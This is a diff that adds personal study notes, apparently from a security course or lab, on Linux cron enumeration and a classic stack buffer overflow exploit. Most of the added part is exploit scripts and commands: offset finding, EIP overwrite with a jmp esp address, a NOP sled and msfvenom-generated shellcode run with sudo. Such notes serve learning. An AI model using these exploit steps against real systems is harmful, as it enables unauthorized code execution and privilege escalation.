@@ -93,3 +93,89 @@ if we have to replace dll or exe then we have to rename it so it fits in the spo
 
 look at registry keys for hkey run and runonce to look for persistence
 auditpol /get /category:* | findstr /i "success failure"  #run this in powershell with escalated privleges
+
+
+
+
+linux buffer overflow,crontab,reverse engineering
+/etc/crontab
+ls /etc/* | grep cron
+find / -iname "*cron*" 2>/dev/null
+./  #current directory
+/bin/ls  #run binary "ls"
+
+
+LINUX BUFFER OVERFLOW
+verify program is vuln to buffer overflow
+gdb func
+pdisass main   #every c function has to have a main 
+pdisass getuserinput  #if its red its vulerable to something,gets is vuln to buffer overflow
+quit
+
+wiremask.eu for string
+SCRIPT
+offset = ""Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+print(offset)
+#SAVE IT
+#user input use "<<<" if not don't use it in command below
+gdb func
+run <<< $(python2 linbuff.py)
+#go to eip copy hex value from it paste as offset in wiremask.eu
+SCRIPT
+offset = "A" * 62
+
+eip = "B" *4
+
+print(offset + eip)
+#SAVE IT,confirms then you can get rid of "B"s after you run it
+env -gdb func
+show env
+unset <whatevers in there> 
+show env   #that bitch better be empty
+run <<< $(python2 linbuff.py)
+info proc map   #must be properly overflowed in order for this part to work
+#first one after the heap,right above the stack
+find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4  #0xff-jump, 0xe4-esp, these two don't change, first to 0x<> values are the ones mentioned in the above output of info proc map
+#grab like five addresses, put them into a comment in the script, pick the one you like, right it by two characters at a time backwards
+
+SCRIPT
+offset = "A" * 62
+
+eip = "\xef\x59\xf6\xf7"
+
+'''
+0x<>
+0x<>
+0x<>
+0x<>
+0x<>
+'''
+nop = "\x90" * 10   #adds space so it can decode, need to have it
+
+print(offset + eip + nop)
+#SAVE IT
+msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python   #generate shellcode
+
+
+SCRIPT
+offset = "A" * 62
+
+eip = "\xef\x59\xf6\xf7"
+
+'''
+0x<>
+0x<>
+0x<>
+0x<>
+0x<>
+'''
+nop = "\x90" * 10   #adds space so it can decode, need to have it
+
+#put shellcode here "buf"
+
+print(offset + eip + nop + buf)
+#SAVE IT
+./func  #not in gdb
+sudo ./func <<< $(python2 linbuff.py)
+#regenerate shellcode or check nop sled for trouble shooting, if that doesn't work choose new eip, if that isn't working then restart from the beginning
